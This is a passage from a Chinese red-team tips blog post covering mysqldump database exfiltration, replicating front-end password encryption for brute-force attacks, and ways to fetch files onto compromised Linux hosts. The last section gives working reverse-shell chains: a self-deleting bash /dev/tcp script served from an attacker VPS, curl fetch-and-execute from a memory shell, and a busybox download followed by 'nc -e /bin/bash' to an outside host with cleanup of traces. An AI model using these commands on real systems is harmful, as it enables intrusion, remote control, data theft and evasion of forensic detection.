`t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436082</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SELECT</span> <span class="comment">/*!40001 SQL_NO_CACHE */</span> <span class="operator">*</span> <span class="keyword">FROM</span> `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436228</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436295</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  use `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436346</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">select</span> @<span class="variable">@collation</span>_database</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436406</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;t\_test&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436702</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436765</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line">...</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.624624</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.624650</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.662944</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Quit</span><br></pre></td></tr></table></figure>

<p>​    从导出过程对数据库正常使用的影响程度上，–single-transaction&lt;–lock-all-tables&lt;–lock-tables，依次递减，如果从数据一致性的角度，推荐使用–single-transaction。</p>
<p>参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/bisal/article/details/118917808" >https://blog.csdn.net/bisal/article/details/118917808<i class="fas fa-external-link-alt"></i></a></p>
<p>​    脱某个表和多个表:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：mysqldump <span class="operator">-</span>h1主机名 <span class="operator">-</span>p端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 库名 表名 表名 <span class="operator">&gt;</span>文件名.<span class="keyword">sql</span></span><br><span class="line">例子：mysqldump <span class="operator">-</span>h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>p3306 <span class="operator">-</span>uroot <span class="operator">-</span>proot mysql t1 t2 <span class="operator">&gt;</span><span class="operator">/</span>data<span class="operator">/</span>backup<span class="operator">/</span>cmdb_t1_t2.sql</span><br></pre></td></tr></table></figure>

<p>​    同时备份多个库:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">格式：mysqldump <span class="operator">-</span>h主机名 <span class="operator">-</span>P端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 <span class="comment">--databases 数据库名1 数据库名2 数据库名3 &gt; 文件名.sql</span></span><br><span class="line">例如：mysqldump <span class="operator">-</span>h192<span class="number">.168</span><span class="number">.1</span><span class="number">.100</span> <span class="operator">-</span>uroot <span class="operator">-</span>ppassword <span class="comment">--databases cmdb bbs blog &gt; /data/backup</span></span><br><span class="line">如果不行，试试不要<span class="comment">--databases</span></span><br></pre></td></tr></table></figure>

<p>​    备份数据库结构不备份数据:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：mysqldump <span class="operator">-</span>h主机名 <span class="operator">-</span>P端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 <span class="comment">--no-data 数据库名1 数据库名2 数据库名3 &gt; 文件名.sql</span></span><br><span class="line">例如：mysqldump <span class="comment">--no-data –databases db1 db2 cmdb &gt; /data/backup/structure.sql</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="前端加密"><a href="#前端加密" class="headerlink" title="前端加密"></a>前端加密</h3><h4 id="phantomJS"><a href="#phantomJS" class="headerlink" title="phantomJS"></a>phantomJS</h4><p>​    学习c0ny1师傅的文章，记录一下。原文地址:<a class="link"   target="_blank" rel="noopener" href="https://gv7.me/articles/2017/jsEncrypter/" >https://gv7.me/articles/2017/jsEncrypter/<i class="fas fa-external-link-alt"></i></a></p>
<p>​    对于前端靶场使用c0ny1师傅提供的靶场。首先在电脑上需要phantomJS软件。phantomJS是一个没有界面的浏览器，除了不能浏览，其他的和正常浏览器一样。使用它来执行我们编写好的脚本。</p>
<p>​    选择sha1进行，抓包。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074258.jpg"
                      alt="image-20220901145940027"
                ></p>
<p>​    可看到密码部分加密，我们把靶场里sha1的加密放在phantomJS里运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074259.jpg"
                      alt="image-20220901150900129"
                ></p>
<p>​    然后插件连接并测试，即可获得加密后的数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074300.jpg"
                      alt="image-20220901150942926"
                ></p>
<p>​    使用数据爆破即可，或者在payload processing里选择插件即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074306.gif"
                      alt="crack"
                ></p>
<p>​    我们看看JsEncrypter里的内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载实现加密算法的js脚本</span></span><br><span class="line"><span class="keyword">var</span> wasSuccessful = phantom.<span class="title function_">injectJs</span>(<span class="string">&#x27;sha1.js&#x27;</span>);<span class="comment">/*引入实现加密的js文件*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">js_encrypt</span>(<span class="params">payload</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> newpayload;</span><br><span class="line">	<span class="comment">/**********在这里编写调用加密函数进行加密的代码************/</span></span><br><span class="line">	newpayload = <span class="title function_">hex_sha1</span>(payload);</span><br><span class="line">	<span class="comment">/**********************************************************/</span></span><br><span class="line">	<span class="keyword">return</span> newpayload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074308.jpg"
                      alt="image-20220903225714934"
                ></p>
<p>​    通常来说，如果一个网站的 js 文件没有做混淆，并能轻松找到加密函数，且加密算法比较简单的话，其实是不需要导入 js 文件的，可以直接将加密函数复制或者自己编写即可，但是往往加密算法的实现比较复杂，需要引入许多依赖，所以还是导入较好，后续编写加密算法再调用其中的依赖。</p>
<p>​    以下提供两种解决办法：</p>
<p>​    1、导入所有js文件</p>
<p>​    2、通过搜索关键字导入js文件，可搜索encrypt、aes、des、md5、key、iv、rsa等</p>
<p>​    通过分析得到：</p>
<p>​    我们可以通过全局搜索接口名称，然后通过路由寻找加密函数，然后一步一步分析。</p>
<p>​    <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12850094.html" >https://www.cnblogs.com/wjrblogs/p/12850094.html<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="定位相关"><a href="#定位相关" class="headerlink" title="定位相关"></a>定位相关</h4><h5 id="onclick定位法"><a href="#onclick定位法" class="headerlink" title="onclick定位法"></a>onclick定位法</h5><p>​    有时候在触发提交表单的标签中会存在一个onClik属性，该属性的值正好是一个js函数。而这个函数往往就是我们要找的数据加密函数。我们只需要找到它定义的地方即可。</p>
<hr>
<h3 id="Linux下载文件"><a href="#Linux下载文件" class="headerlink" title="Linux下载文件"></a>Linux下载文件</h3><p>​    在渗透的过程中，遇见的bash无法执行怎么办，或者目标机器没有nc怎么办，再或者，等等一系列原因导致无法利用。提供以下几种办法:</p>
<h4 id="1、curl"><a href="#1、curl" class="headerlink" title="1、curl"></a>1、curl</h4><p>​    在服务器编写一个脚本 ，脚本的内容是bash反弹，并且删除原脚本，在利用内存马让目标机器去请求执行。</p>
<p>​    VPS脚本1:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/8989 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="built_in">rm</span> <span class="variable">$0</span>     <span class="comment">#删除当前这个脚本</span></span><br></pre></td></tr></table></figure>

<p>​    VPS记得把脚本用Python起个服务挂起来：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>​    VPS上nc开启监听:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>

<p>​    目标机器内存shell执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://x.x.x.x/1 -o /tmp/1</span><br><span class="line">/bin/bash /tmp/1    <span class="comment">#建议放到临时目录</span></span><br></pre></td></tr></table></figure>

<p>​    此处我们看一下curl的用法，所以此时我们不指定为/tmp/1，如果指定为1.sh这样的话，就会直接在当前目录下生成文件。同理，我们如果在拿到shell的情况下，用这个办法变可以写一个🐎上去，而路径及为当前的web路径。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -o 参数将服务器的回应保存成文件，等同于 wget 命令。</span></span><br><span class="line">curl -o example.html https://www.example.com</span><br><span class="line"><span class="comment">#上面命令将 www.example.com 保存成 example.html 。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -O 参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</span></span><br><span class="line">curl -O https://www.example.com/foo/bar.html</span><br><span class="line"><span class="comment">#上面命令将服务器回应保存成文件，文件名为bar.html。</span></span><br></pre></td></tr></table></figure>

<h4 id="2、busybox"><a href="#2、busybox" class="headerlink" title="2、busybox"></a>2、busybox</h4><p>​    然后我们就发现，目标没得bash，或者bash权限执行不了，要寄了？采用nc链接，可是目标机器并没有安装nc，所以这时候用到工具 busybox ，集成了linux常用命令和工具。</p>
<p>​    首先先在自己的VPS上把这busybox下载下来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/binaries/1.20.0/busybox-x86_64</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>​    vps脚本2（这个脚本2也要放到同级目录下并与busybox一起映射到80服务上）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f /tmp/busybox ];<span class="keyword">then</span>  <span class="comment">#判断当前机器tmp目录是否以安装busybox</span></span><br><span class="line">wget http://x.x.x.x/busybox-x86_64 -O /tmp/busybox  <span class="comment">#从VPS80端口下载busybox 到tmp目录并取名busybox</span></span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/busybox <span class="comment"># 添加一个执行权限</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">/tmp/busybox nc x.x.x.x 9999 -e /bin/bash &amp;  <span class="comment">#用nc连接 9999端口</span></span><br><span class="line"><span class="built_in">sleep</span> 2  <span class="comment">#延迟时间最好不要动</span></span><br><span class="line"><span class="built_in">rm</span> /tmp/busybox  <span class="comment">#删除busybox</span></span><br><span class="line"><span class="built_in">rm</span> <span class="variable">$0</span>  <span class="comment">#删除当前脚本</span></span><br></pre></td></tr></table></figure>

<p>​    vps开启监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>

<p>​    目标内存shell执行,让目标机器从VPS上下载脚本2并且执行脚本2的内容并且回弹nc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://x.x.x.x/2 -o /tmp/2</span><br><span class="line">/bin/bash /tmp/2</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074309.jpg"
                      alt="image-20220901223831200"
                ></p>
<h4 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h4>
        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>本文标题：没用的小技巧(RED)</li>
        <li>本文作者：mes9s0</li>
        <li>创建时间：2022-08-07 22:40:56</li>
        <li>
            本文链接：https://mes9s0.github.io/2022/08/07/没用的小技巧-RED/
        </li>
        <li>
            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">#数据库</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/%E5%85%B6%E4%BB%96/">#其他</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/%E9%98%B2%E6%BA%AF%E6%BA%90/">#防溯源</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/">#痕迹清理</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2022/08/13/Python%E7%88%AC%E8%99%AB%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Python爬虫从零到一</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2022/08/04/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-3-Java%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Java安全从零到一(3)-Java高级编程</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;评论</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'VOW0hvnes0uKAXRkVyEuVvR4-9Nh9j0Va',
                    appKey: '46zItzkbXxcS29wD64JlGikD',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '😜 尽情吐槽吧~',
                    lang: 'zh-CN'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'mes9s0';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2022</span>
              -
            
            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">mes9s0</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E8%9C%9C%E7%BD%90%E6%8F%92%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">防蜜罐插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E7%A7%8D%E9%92%88%E5%AF%B9%E7%83%AD%E7%82%B9%E7%9A%84%E8%9C%9C%E7%BD%90"><span class="nav-number">2.</span> <span class="nav-text">一种针对热点的蜜罐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">Linux痕迹清理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-number">3.1.</span> <span class="nav-text">日志文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%96%B9%E6%B3%95"><span class="nav-number">3.1.1.</span> <span class="nav-text">清除方法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80%E7%9B%B4%E6%8E%A5%E6%B8%85%E7%A9%BA%EF%BC%9A"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">方案一直接清空：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C%E9%83%A8%E5%88%86%E5%88%A0%E9%99%A4%EF%BC%9A"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">方案二部分删除：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%A1%88%E4%B8%89%E9%9A%90%E8%97%8F%E7%99%BB%E9%99%86%EF%BC%9A"><span class="nav-number">3.1.1.3.</span> <span class="nav-text">方案三隐藏登陆：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#History%E8%AE%B0%E5%BD%95"><span class="nav-number">3.2.</span> <span class="nav-text">History记录</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%85%E9%99%A4history%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95"><span class="nav-number">3.2.1.</span> <span class="nav-text">清除history历史命令记录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E8%AE%B0%E5%BD%95history%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="nav-number">3.2.2.</span> <span class="nav-text">不记录history历史命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E9%94%AE%E6%B8%85%E9%99%A4history%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E8%84%9A%E6%9C%AC"><span class="nav-number">3.3.</span> <span class="nav-text">一键清除history和系统日志脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E9%99%A4web%E6%97%A5%E5%BF%97%E7%97%95%E8%BF%B9"><span class="nav-number">3.4.</span> <span class="nav-text">清除web日志痕迹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E6%96%87%E4%BB%B6%E4%BC%AA%E8%A3%85"><span class="nav-number">4.</span> <span class="nav-text">Linux文件伪装</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E8%A3%85%E4%B8%8E%E9%9A%90%E8%97%8F"><span class="nav-number">4.1.</span> <span class="nav-text">伪装与隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%E6%88%B3"><span class="nav-number">4.1.1.</span> <span class="nav-text">修改时间戳</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="nav-number">4.1.2.</span> <span class="nav-text">文件隐藏</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="nav-number">4.1.3.</span> <span class="nav-text">文件属性</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%A6%E9%99%A4"><span class="nav-number">4.2.</span> <span class="nav-text">文件擦除</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#shred%E5%91%BD%E4%BB%A4"><span class="nav-number">4.2.1.</span> <span class="nav-text">shred命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dd%E5%91%BD%E4%BB%A4"><span class="nav-number">4.2.2.</span> <span class="nav-text">dd命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">5.</span> <span class="nav-text">Windows入侵痕迹清理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3"><span class="nav-number">6.</span> <span class="nav-text">数据库相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%A7%E5%B0%8F"><span class="nav-number">6.1.</span> <span class="nav-text">查看数据库大小</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%B1%E8%A3%A4%E5%A4%87%E4%BB%BD%F0%9F%AB%A3"><span class="nav-number">6.2.</span> <span class="nav-text">脱裤备份🫣</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86"><span class="nav-number">7.</span> <span class="nav-text">前端加密</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phantomJS"><span class="nav-number">7.1.</span> <span class="nav-text">phantomJS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E7%9B%B8%E5%85%B3"><span class="nav-number">7.2.</span> <span class="nav-text">定位相关</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#onclick%E5%AE%9A%E4%BD%8D%E6%B3%95"><span class="nav-number">7.2.1.</span> <span class="nav-text">onclick定位法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-number">8.</span> <span class="nav-text">Linux下载文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81curl"><span class="nav-number">8.1.</span> <span class="nav-text">1、curl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81busybox"><span class="nav-number">8.2.</span> <span class="nav-text">2、busybox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81"><span class="nav-number">8.3.</span> <span class="nav-text">3、</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



